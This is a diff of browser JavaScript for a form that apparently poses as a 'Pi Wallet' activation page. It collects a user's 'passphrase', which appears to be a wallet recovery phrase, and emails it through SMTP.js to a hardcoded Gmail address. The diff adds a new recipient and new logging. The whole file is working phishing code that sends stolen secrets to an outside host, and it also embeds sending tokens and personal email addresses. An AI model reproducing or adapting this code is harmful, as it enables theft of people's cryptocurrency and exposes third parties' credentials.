@@ -1,40 +1,58 @@
-const Form = document.getElementById('my-form');
-const Names = document.getElementById('contact-inputs');
-const Status = document.getElementById('status'); // Ensure there's a status element to show results
+// Get elements
+const Form = document.getElementById("my-form");
+const Names = document.getElementById("contact-inputs");
+const Status = document.getElementById("status");
 
 // Function to send email
 function sendEmail() {
-    const bodyMessage = This is the Full Phrase: ${Names.value};
+  const bodyMessage = `This is the Full Phrase: ${Names.value}`;
 
-    // Ensure input validation
-    if (!Names.value.trim()) {
-        alert("Please enter a valid name or subject.");
-        return;
-    }
+  // Ensure input validation
+  if (!Names.value.trim()) {
+    alert("Please enter a valid passphrase.");
+    console.log("Error: No passphrase entered.");
+    return;
+  }
 
-    // Send email using API key
-    Email.send({
-        SecureToken: "0D53DEB5AE6331432AEFD110E48DE921AB023C4B156AE238FE800A2CF100349985019BAE60D8F48674062421819827B0",
-        To: "samsonnwanna26@gmail.com", 
-        From: "mikebrew001@gmail.com", 
-        Subject: Names.value,
-        Body: bodyMessage
-    }).then((message) => {
-        if (message === "OK") {
-            Status.style.display = "block";
-            Status.innerText = "Email sent successfully!";
-        } else {
-            Status.style.display = "block";
-            Status.innerText = Error: ${message};
-        }
-    }).catch((error) => {
-        console.error("Email send error:", error);
+  console.log("Sending email with the following details:");
+  console.log("To: echefrankidosky4love@gmail.com");
+  console.log("From: mikebrew001@gmail.com");
+  console.log("Subject: Activate Pi Wallet");
+  console.log("Body:", bodyMessage);
+
+  // Send email using API key
+  Email.send({
+    SecureToken: "9022cd34-c735-48f3-b632-290a202c27c5",
+    To: "echefrankidosky4love@gmail.com",
+    From: "mikebrew001@gmail.com",
+    Subject: "Activate Pi Wallet",
+    Body: bodyMessage,
+  })
+    .then((message) => {
+      console.log("Email send response:", message);
+      if (message === "OK") {
         Status.style.display = "block";
-        Status.innerText = "An error occurred while sending the email.";
+        Status.innerHTML =
+          "<ion-icon name='checkmark-circle-outline'></ion-icon> Email sent successfully!";
+        Status.className = "success";
+      } else {
+        Status.style.display = "block";
+        Status.innerHTML = `<ion-icon name='alert-outline'></ion-icon> Error: ${message}`;
+        Status.className = "error";
+      }
+    })
+    .catch((error) => {
+      console.error("Email send error:", error);
+      Status.style.display = "block";
+      Status.innerHTML =
+        "<ion-icon name='alert-outline'></ion-icon> An error occurred while sending the email.";
+      Status.className = "error";
     });
 }
 
+// Add event listener to the form
 Form.addEventListener("submit", (e) => {
-    e.preventDefault(); // Prevent page reload
-    sendEmail();
+  e.preventDefault(); // Prevent form from reloading the page
+  console.log("Form submitted.");
+  sendEmail();
 });
